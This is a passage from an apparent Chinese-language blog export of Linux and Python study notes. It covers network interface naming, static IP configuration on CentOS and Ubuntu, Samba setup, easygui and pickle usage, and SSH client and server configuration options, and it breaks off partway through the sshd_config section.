    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Network/Network/</url>
    <content><![CDATA[<h2 id="一、网卡命名规范（设备类型-设备位置-数字）"><a href="#一、网卡命名规范（设备类型-设备位置-数字）" class="headerlink" title="一、网卡命名规范（设备类型 + 设备位置 + 数字）"></a>一、网卡命名规范（设备类型 + 设备位置 + 数字）</h2><p><strong>设备类型：</strong></p>
<table>
<thead>
<tr>
<th align="center">格式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">en</td>
<td align="left">以太网（Ethernet）</td>
</tr>
<tr>
<td align="center">ib</td>
<td align="left">无限宽带（InfiniBand）</td>
</tr>
<tr>
<td align="center">sl</td>
<td align="left">串列线路互联网协议（slip：Serial line IP）</td>
</tr>
<tr>
<td align="center">wl</td>
<td align="left">无线局域网（WLAN）</td>
</tr>
<tr>
<td align="center">www</td>
<td align="left">无线广域网（WWAN）</td>
</tr>
</tbody></table>
<p><strong>设备位置：</strong></p>
<table>
<thead>
<tr>
<th align="center">格式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">o</td>
<td align="left">集成设备</td>
</tr>
<tr>
<td align="center">s</td>
<td align="left">扩展槽的索引号</td>
</tr>
<tr>
<td align="center">x</td>
<td align="left">基于 MAC 进行命名</td>
</tr>
<tr>
<td align="center">p</td>
<td align="left">PCI 扩展总线</td>
</tr>
</tbody></table>
<p><strong>实例：</strong></p>
<table>
<thead>
<tr>
<th align="left">格式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">eth0</td>
<td align="left">默认的网卡名</td>
</tr>
<tr>
<td align="left">eno1</td>
<td align="left">主板 BIOS 内置的网卡</td>
</tr>
<tr>
<td align="left">ens1</td>
<td align="left">主板 BIOS 内置的 PCI 网卡（PCI：主板上的一个插槽）</td>
</tr>
<tr>
<td align="left">enp0s2</td>
<td align="left">PCI 独立网卡（PCI：主板上的一个插槽）</td>
</tr>
<tr>
<td align="left">wlp3s0</td>
<td align="left">PCI 无线网卡（PCI：主板上的一个插槽）</td>
</tr>
<tr>
<td align="left">wwp0s29f7u2i2</td>
<td align="left">4G modem</td>
</tr>
<tr>
<td align="left">wlp0s2f1u4u1</td>
<td align="left">连接在 USB Hub 上的无线网卡</td>
</tr>
<tr>
<td align="left">enx78e7d1ea46da</td>
<td align="left">PCI 网卡（PCI：主板上的一个插槽）</td>
</tr>
</tbody></table>
<h2 id="二、Centos-配置静态-IP"><a href="#二、Centos-配置静态-IP" class="headerlink" title="二、Centos 配置静态 IP"></a>二、Centos 配置静态 IP</h2><p>Centos7 默认网络配置文件路径为：<code>/etc/sysconfig/network-scripts/ifcfg-eth0</code> （有一些默认文件则是 <code>ifcfg-ens33</code> 或是其他的）</p>
<p>1、编辑配置文件 <code>ifcfg-eth0</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  在文件中找到如下内容</span><br><span class="line">BOOTPROTO&#x3D;dhcp		    #  将文件中的这行修改为 static</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;no	#  将文件中的这行修改为 yes</span><br><span class="line">ONBOOT&#x3D;no   			#  将文件中的这行修改为 yes</span><br><span class="line"></span><br><span class="line">#  在文件末尾添加如下内容</span><br><span class="line">IPADDR&#x3D;10.1.82.232	    #  网卡 IP</span><br><span class="line">NETMASK&#x3D;255.255.255.0	#  子网掩码</span><br><span class="line">GATEWAY&#x3D;10.1.82.254		#  网关</span><br><span class="line">DNS1&#x3D;8.8.8.8			#  首选 DNS</span><br></pre></td></tr></table></figure>
<p>2、<code>ifcfg-eth0</code> 文件详解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TYPE&#x3D;Ethernet			#  网卡类型</span><br><span class="line">PROXY_METHOD&#x3D;none		#  代理方式（默认关闭）</span><br><span class="line">BROWSER_ONLY&#x3D;no		    #  代理设置是否仅用于浏览器</span><br><span class="line">BOOTPROTO&#x3D;static		#  网卡的引导协议（static：静态 IP，dhcp：动态 IP，none：不启用）</span><br><span class="line">DEFROUTE&#x3D;yes			#  默认路由</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;yes	#  是否开启 IPV4 致命错误检测</span><br><span class="line">IPV6INIT&#x3D;yes			#  IPV6 是否自动初始化</span><br><span class="line">IPV6_AUTOCONF&#x3D;yes		#  IPV6 是否自动配置</span><br><span class="line">IPV6_DEFROUTE&#x3D;yes		#  IPV6 是否可以为默认路由</span><br><span class="line">IPV6_FAILURE_FATAL&#x3D;no	#  是否开启 IPV6 致命错误检测</span><br><span class="line">IPV6_ADDR_GEN_MODE&#x3D;stable-privacy		#  IPV6 地址生成模型</span><br><span class="line">NAME&#x3D;eth0</span><br><span class="line">UUID&#x3D;b3942c00-c0e4-45e8-8e4d-f1dd06ab9a09	#  统用唯一识别码（不能跟其他 UUID 重复）</span><br><span class="line">DEVICE&#x3D;eth0			#  网卡名称</span><br><span class="line">ONBOOT&#x3D;yes			#  是否开机自启</span><br><span class="line"></span><br><span class="line">IPADDR&#x3D;10.1.82.232	    #  网卡 IP</span><br><span class="line">NETMASK&#x3D;255.255.255.0	#  子网掩码</span><br><span class="line">GATEWAY&#x3D;10.1.82.254		#  网关</span><br><span class="line">DNS1&#x3D;8.8.8.8			#  首选 DNS</span><br></pre></td></tr></table></figure>
<p>3、配置完后需重启服务<br>重启网络：<code>systemctl restart network</code><br>停止：<code>systemctl stop network</code><br>开启：<code>systemctl start network</code><br>查看状态：<code>systemctl status network</code></p>
<h2 id="三、Ubuntu-配置静态-IP"><a href="#三、Ubuntu-配置静态-IP" class="headerlink" title="三、Ubuntu 配置静态 IP"></a>三、Ubuntu 配置静态 IP</h2><p>1、如配置文件路径为 <code>/etc/network/interfaces／interfaces</code>，则在文件末尾添加如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  添加网卡 eth0 并设置为 static（静态 IP）模式</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.123	#  网卡 IP</span><br><span class="line">netmask 255.255.255.0	#  子网掩码</span><br><span class="line">gateway 192.168.1.1	#  网关</span><br><span class="line">dns 114.114.114.114	#  dns</span><br></pre></td></tr></table></figure>
<p>配置完成后需重启服务<br>重启网络：<code>sudo systemctl restart network</code><br>停止：<code>sudo systemctl stop network</code><br>开启：<code>sudo systemctl start network</code><br>查看状态：<code>sudo systemctl status network</code></p>
<p>２、如配置文件路径为：<code>/etc/netplan/01-network-manager-all.yaml</code>，则在文件末尾添加如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">静态 IP 配置文件内容如下</span><br><span class="line">network:</span><br><span class="line">    version: 2</span><br><span class="line">    renderer: NetworkManager</span><br><span class="line">    ethernets:</span><br><span class="line">        ens33:</span><br><span class="line">            dhcp4: no</span><br><span class="line">            dhcp6: no</span><br><span class="line">            addresses: [192.168.1.233&#x2F;23]</span><br><span class="line">            gateway4: 192.168.0.1</span><br><span class="line">            nameservers:</span><br><span class="line">                 addresses: [114.114.114.114,180.76.76.76]</span><br><span class="line"></span><br><span class="line">动态 IP 配置文件内容如下</span><br><span class="line">network:</span><br><span class="line">    ethernets:</span><br><span class="line">        ens33:</span><br><span class="line">            dhcp4: true</span><br><span class="line">    version: 2</span><br></pre></td></tr></table></figure>
<p>使配置生效命令：<code>sudo netplan apply</code></p>
<p>如果配置生效后旧 IP 依然存在则使用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ip addr flush dev ens33</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup ens33</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Samba</title>
    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Samba/Samba/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一种免费软件，由服务器及客户端程序构成。</p>
<p>SMB 是在局域网上共享文件和打印机的一种通信协议</p>
<p>默认端口号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp：139、445</span><br><span class="line">UDP：137、138</span><br></pre></td></tr></table></figure>
<h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 Samba：<code>yum -y install samba</code><br>默认配置文件路径：<code>/etc/samba/smb.conf</code></p>
<h3 id="可用变量"><a href="#可用变量" class="headerlink" title="可用变量"></a>可用变量</h3><p>变量名|描述|变量名|描述<br>:-:|:-|:-:|:-|:-<br>%a | 客户机的结构（只支持：Samba、WfWg、WinNT、Win95） | %d | 当前服务进程 ID<br>%I | 客户机的 IP | %P | 当前服务的根目录<br>%L | 服务器的 NETBIOS 名称 | %N | NIS 服务器名<br>%R | 采用的协议等级（值可以是 CORE，COREPLUS，LANMAN1, LANMAN2，NT1） | %S | 当前服务名<br>%T | 当前日期和时间 | %v | Samba 服务的版本号<br>%h | 运行 Samba 服务机器的主机名 | %H | 当前服务的用户的 Home 目录<br>%g | 当前用户所在的主工作组 | %G | 当前对话的用户的主工作组<br>%m | 客户机的 NETBIOS 名称 | %M | 客户机的主机名<br>%u | 当前服务的用户名 | %U | 当前对话的用户名</p>
<h3 id="smb-conf-配置文件常用参数"><a href="#smb-conf-配置文件常用参数" class="headerlink" title="smb.conf 配置文件常用参数"></a>smb.conf 配置文件常用参数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]		#  全局配置（默认有该设置，如需要在全局下添加东西则只需在文件中该行的下面添加即可）</span><br><span class="line">config file&#x3D;&#x2F;etc&#x2F;&#x2F;samba&#x2F;%U	#  设置配置文件的绝对路径（需要在全局配置下添加）</span><br><span class="line"></span><br><span class="line">[homes]		#  用于共享用户目录（默认有该配置）</span><br><span class="line"></span><br><span class="line">[printers]	#  用于共享打印机（默认有该配置）</span><br><span class="line"></span><br><span class="line">[test]			    #  共享名</span><br><span class="line">comment &#x3D; test-test	#  该共享的说明</span><br><span class="line">path &#x3D; &#x2F;test		#  共享文件路径</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">browseable &#x3D; yes	#  可浏览</span><br><span class="line">public &#x3D; yes		#  允许 guest 账户访问</span><br><span class="line">guest ok &#x3D; yes		#  允许 guest 用户访问</span><br><span class="line">writeable &#x3D; yes		#  用户可写</span><br><span class="line">write list &#x3D; test-1,test-2	#  指定 test-1 用户跟 test-2 用户可写</span><br><span class="line">admin users &#x3D; admin         #  该共享的管理者</span><br><span class="line">valid users &#x3D; test-1,test-2		#  设置用户白名单（test-1 与 test-2 用户可访问）</span><br><span class="line">invalid users &#x3D; test-3,test-4	#  设置用户黑名单（test-3 与 test-4 用户禁止访问）</span><br><span class="line">create mode &#x3D; 0644	#  新建文件后文件的权限</span><br><span class="line">directory mode &#x3D; 0755	#  新建文件夹后文件夹的权限</span><br><span class="line">veto files &#x3D; &#x2F;*root*&#x2F;*.exe&#x2F;	#  禁止上传 *.exe 的文件跟文件名含有 root 的文件或文件夹</span><br><span class="line"></span><br><span class="line">#  日志相关</span><br><span class="line">log file &#x3D; &#x2F;var&#x2F;log&#x2F;samba&#x2F;%m.log	#  指定日志存放位置</span><br><span class="line">max log size &#x3D;10		#  设置日志文件大小（单位为：M）</span><br><span class="line"></span><br><span class="line">#  安全相关</span><br><span class="line">encrypt passwords &#x3D;yes	#  密码加密</span><br><span class="line">smb passwd file &#x3D; &#x2F;etc&#x2F;samba&#x2F;smbpasswd	#  Samba 用户密码文件存放位置</span><br><span class="line">username map &#x3D; &#x2F;etc&#x2F;samba&#x2F;smbusers      #  Samba 用户文件存放位置</span><br><span class="line">security &#x3D; share		#  安全选项（share、user、server、domain）</span><br><span class="line">	- hare：用户访问 Samba Server 不需要提供用户名和密码</span><br><span class="line">	- user：Samba Server 共享目录只能被授权的用户访问，由 Samba  Server负责检查账号和密码的正确性</span><br><span class="line">	- server：依靠其他 Wwindows NT &#x2F;2000 或 Samba Server 来验证用户名和密码</span><br><span class="line">	- domain：域安全级别，使用主域控制器（PDC）来完成验证</span><br><span class="line"></span><br><span class="line">#  打印机相关</span><br><span class="line">printable &#x3D; yes         #  打印机是否可打印（默认有该参数）</span><br><span class="line">load printers &#x3D; yes     #  当 Samba 启动时共享打印机</span><br><span class="line">printcap name &#x3D; cups	#  设置共享打印机的配置文件</span><br></pre></td></tr></table></figure>
<h3 id="新建-Samba-用户"><a href="#新建-Samba-用户" class="headerlink" title="新建 Samba 用户"></a>新建 Samba 用户</h3><p>创建 Samba 用户需先建立对应的本地用户 <code>useradd test</code></p>
<p>新建 test 用户：<code>smbpasswd -a test</code><br>删除 test 用户：<code>smbpasswd -x test</code><br>禁用 test 用户：<code>smbpasswd -d test</code><br>启用 test 用户：<code>smbpasswd -e test</code><br>清除 test 用户密码：<code>smbpasswd -n test</code><br>列出 samba 用户：<code>pdbedit -L</code><br>列出 samba 用户详细：<code>pdbedit -Lv</code></p>
<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><p>1、新建用户，并设置共享目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  新建本地用户 test</span><br><span class="line">useradd test</span><br><span class="line">#  新建 smb 用户 test</span><br><span class="line">smbpasswd -a test	#  此处需要设置密码</span><br><span class="line">#  设置共享目录</span><br><span class="line">mkdir &#x2F;test</span><br></pre></td></tr></table></figure>
<p>2、编辑配置文件<br>编辑 Samba 配置文件：<code>vim /etc/samba/smb.conf</code><br>在文件内添加如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[test]			#  共享名</span><br><span class="line">comment &#x3D; test	#  该共享的描述</span><br><span class="line">path &#x3D; &#x2F;test	#  共享的目录</span><br><span class="line">writeable &#x3D; yes	#  允许写入</span><br></pre></td></tr></table></figure>
<p>3、重启服务<br>编辑完配置文件后重启服务即可<br>停止服务：<code>systemctl stop smb</code><br>启动服务：<code>systemctl start smb</code><br>重启服务：<code>systemctl restart smb</code><br>查看服务状态：<code>systemctl status smb</code></p>
]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>easygui 库</title>
    <url>/2021/02/09/Python/%E5%BA%93/EasyGui%E5%BA%93/easygui%E5%BA%93/</url>
    <content><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>EasyGUI 是一个用 Python 编写的非常简易的 GUI 编程模块</p>
<h2 id="二、实例："><a href="#二、实例：" class="headerlink" title="二、实例："></a>二、实例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easygui.msgbox(&#39;123&#39;)</span><br><span class="line">easygui.msgbox(msg&#x3D;&#39;123&#39;, title&#x3D;&#39;456&#39;, ok_button&#x3D;&#39;456&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; [&#39;123&#39;, &#39;456&#39;, &#39;789&#39;]</span><br><span class="line">easygui.choices(msg&#x3D;&#39;123&#39;, title&#x3D;&#39;456&#39;, choices &#x3D; a)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easygui.choicex(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, choicex&#x3D;(&#39;123&#39;, &#39;456&#39;, &#39;789&#39;))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easygui.ccbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, choicex&#x3D;(&#39;确定&#39;, &#39;取消&#39;）</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easygui.buttonbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, choices&#x3D;(&#39;123&#39;, &#39;456&#39;, &#39;789&#39;))</span><br><span class="line"></span><br><span class="line">easygui.buttonbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, choices&#x3D;(&#39;123&#39;, &#39;456&#39;, &#39;789&#39;), img&#x3D;&#39;test.png&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">easygui.enterbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, strip&#x3D;True, image&#x3D;&#39;test.gif&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g.passwordbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, image&#x3D;&#39;test.gif&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g.multpasswordbox(msg&#x3D;&#39;123&#39;, title&#x3D;&quot;456&quot;, fields&#x3D;(&quot;用户名&quot;, &#39;密码&#39;), values&#x3D;&#39;1&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g.integerbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, lowerbound&#x3D;&#39;0&#39;, upperbound&#x3D;&#39;99&#39;, image&#x3D;&#39;test.gif&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g.multenterbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, fields&#x3D;(&#39;123&#39;, &#39;456&#39;, &#39;789&#39;), values&#x3D;(&#39;123&#39;, &#39;456&#39;))</span><br></pre></td></tr></table></figure>
<p>&emsp;//  fields为每行的名字，values为在第一处插入字符123，第二处插入字符456</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g.textbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, codebox&#x3D;False)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g.diropenbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, default&#x3D;&#39;c:\\&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g.fileopenbox(msg&#x3D;&#39;1&#39;, title&#x3D;&#39;2&#39;, default&#x3D;&#39;c:\\&#39;, filetypes&#x3D;[&#39;*.txt&#39;], multiple&#x3D;True)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="三、常用函数："><a href="#三、常用函数：" class="headerlink" title="三、常用函数："></a>三、常用函数：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msgbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  消息框</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">choicebox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  单项选择框（必须选择一个选项）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mutchoicebox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  多项选择框（可以选择0个，1个或者同时选择多个选项)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ccbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  弹出一个  Continue / Cancel  对话框（只有两个按钮）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ynbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  跟 ccobx 功能一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">boolbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  跟 ccbox 格式类似，但是当第一个按钮被点击时返回1，否则返回0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">buttombox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  可以定义一组自己的按钮，当用户点击任意一个按钮时，则返回按钮的文本内容。当用户点击取消或者关闭窗口时，则返回默认选项（第一个选项）。可插入 gif / png 图片</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">indexbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  跟 buttombox 格式类似，但是点击按钮时返回的是序号（第一个按钮返回0，第二个返回1）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enterbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  提供一个最简单的输入框 strip=True 时会自动去除首尾的空格，如需保留首尾的空格，则设置为 strip=False</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwordbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  跟 enterbox 格式类似，不同的是用户输入的内容用 * 显示出来，返回用户输入的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">multpasswordbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  跟 multenterbox 格式类似，但最后一行输入框显示为密码的形式（ * ）<br>    • fields参数设置每行的名字<br>    • values参数在第一行（此处为第一行）处插入预先设置的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  为用户提供一个简单的输入框，用户只能输入范围内<br>    • lowerbound参数设置最小值，upperbound参数设置最大值的整型数值，否则会要求用户重新输入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mulenterbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  为用户提供多个简单的输入框，需注意以下几点：<br>    • 如果用户输入的值比选项少的话，则返回列表中的值用空字符串填充用户为输入的选项。<br>    • 如果用户输入的值比选项多的话，则返回的列表中的值将截断为选项的数量。<br>    • 如果用户取消操作，则返回域中的列表的值或者None值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">textbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  文本（codebox值为False时，设置为等宽字体（会自动换行））</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diropenbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  提供一个对话框，返回用户选择的目录名，该目录名带有完整的路径<br>    • default参数用于设置默认的打开目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fileopenbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  提供一个对话框，返回用户选择的文件名，该文件名带有完整的路径<br>    • default参数用于设置默认的打开目录<br>    • filetypes参数用于设置包含文件的类型<br>    • multiple参数为True时，则可以多选</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exceptionbox</span><br></pre></td></tr></table></figure>
<p>&emsp;//  捕获异常</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>pickle 库</title>
    <url>/2021/02/09/Python/%E5%BA%93/pickle%E5%BA%93/pickle%20%E5%BA%93/</url>
    <content><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>将文本信息转变为二进制数据流存储在一个文件中，便于下次使用</p>
<h2 id="二、常用函数："><a href="#二、常用函数：" class="headerlink" title="二、常用函数："></a>二、常用函数：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dump(object, file, protocol&#x3D;None)</span><br></pre></td></tr></table></figure>
<ul>
<li>必填参数 obj 表示将要封装的对象</li>
<li>必填参数 file 表示 object 要写入的文件对象，file 必须以二进制模式打开，即 wb</li>
<li>可选参数 protocol 表示告知 pickle 使用的协议，支持的协议有 0，1，2，3 ，默认的协议是添加在 Python 3 中的协议 3。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load(file)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  从字节对象中读取被封装的对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dumps(object)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  将 object 对象序列化并返回一个 byte 对象，而不是存入文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loads(bytes_object)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  从字节对象中读取被封装的对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">My_list &#x3D; (&#39;this is a string&#39;, 42, [1, 2, 3], None)</span><br><span class="line">pickle_file &#x3D; open (&#39;My_list.pkl&#39;, &#39;wb&#39;)</span><br><span class="line">pickle.dump (My_list, pickle_file)</span><br><span class="line">pickle_file.close()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  把 My_list 列表中的值写入到 pickle_file</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pickle_file.close()</span><br><span class="line">pickle_file2 &#x3D; open (&#39;my_list.pkl&#39;, &#39;rb&#39;)</span><br><span class="line">i &#x3D; pickle.load(pickle_file2)</span><br><span class="line"></span><br><span class="line">print (i)</span><br><span class="line">pickle_file2.close()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  将读序列化读出的 pickle_file2 值，赋值给 i</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH</title>
    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/ssh/ssh/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSH 是为远程登陆会话和其他网络服务提供安全性的协议</p>
<p>默认端口号为：<code>22</code><br>客户端配置文件：<code>/etc/ssh/ssh_config</code><br>服务端配置文件：<code>/etc/ssh/sshd_config</code></p>
<h2 id="二、ssh-config"><a href="#二、ssh-config" class="headerlink" title="二、ssh_config"></a>二、ssh_config</h2><p><code>ssh_config</code> 配置文件常用参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host *			#  有效的主机（多个主机可用空格隔， “*” 表示所有）</span><br><span class="line">ForwardAgent no	#  连接是否经过代理验证（如果是）转发给远程计算机</span><br><span class="line">ForwardX11 no	#  连接受否被自动重定向到安全的通道和显示集</span><br><span class="line">RhostsRSAAuthentication no	#  不使用 RSA 算法基于 rhosts 的安全验证（仅 Version 1 版本使用）</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">PasswordAuthentication yes	#  使用口令验证</span><br><span class="line">HostbasedAuthentication no	#  与 RhostsRSAAuthentication 类似（Version2 使用）。</span><br><span class="line">GSSAPIAuthentication no		#  是否允许使用基于 GSSAPI 的用户认证（默认值为 ”yes”，仅用于 Version2）</span><br><span class="line">BatchMode no			#  如为 “yes“，passphrase&#x2F;password（交互式输入口令）的提示将被禁止</span><br><span class="line">CheckHostIP yes			#  设置 SSH 是否检查看连接到服务器的主机的 IP 地址以防止 DNS 欺骗（建议设置为 “yes“）</span><br><span class="line">AddressFamily any		#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ConnectTimeout 0		#  设置连接超时时间</span><br><span class="line">StrictHostKeyChecking ask       #  如果设置为 ”yes“，则不会自动把计算机的密钥加入 ”HOME&#x2F;.ssh&#x2F;known_hosts&quot; 文件，并且以一旦计算机的密钥发生了变化，就拒绝连接</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;identity	#  设置从哪个文件读取用户的 RSA 安全验证标识</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ecdsa</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_ed25519</span><br><span class="line">Port 22			#  设置端口号</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">Cipher 3des		#  设置加密用的密码</span><br><span class="line">Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc	#  指定 Version2 使用的加密算法（多个算法之间使用逗号分隔）</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160	#  制定允许在 Version2 中使用哪些消息摘要算法来进行数据校验</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="三、sshd-config"><a href="#三、sshd-config" class="headerlink" title="三、sshd_config"></a>三、sshd_config</h2><p><code>sshd_config</code> 配置文件常用参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  常用</span><br><span class="line">Port 22			#  端口号</span><br><span class="line">AddressFamily any	#  指定使用哪种地址协议（默认：any、仅IPv4：IPv4、仅IPv6：IPv6）</span><br><span class="line">ListenAddress 0.0.0.0	#  监听地址（0.0.0.0 表示所有地址）</span><br><span class="line">ListenAddress ::		#  监听地址（IPv6 地址）</span><br><span class="line">Protocol 2		#  指定 SSH 的协议版本，1 或 2（如需同时支持两者，只需使用逗号分隔，如：1，2）</span><br><span class="line">LogLevel INFO		#  日志等级（QUIET, FATAL, ERROR, INFO, VERBOSE, DEBUG, DEBUG1, DEBUG2, and DEBUG3）</span><br><span class="line">UserDNS no		#  禁止DNS反向解析</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">PermitRootLogin no		#  禁止root用户登录</span><br><span class="line">PermitEmptyPasswords no 	#  禁止空密码用户登录</span><br><span class="line">LoginGraceTime 2m	#  登录验证时间为2分钟</span><br><span class="line">MaxAuthTries 6		#  最大重试次数6次</span><br><span class="line">AllowUsers 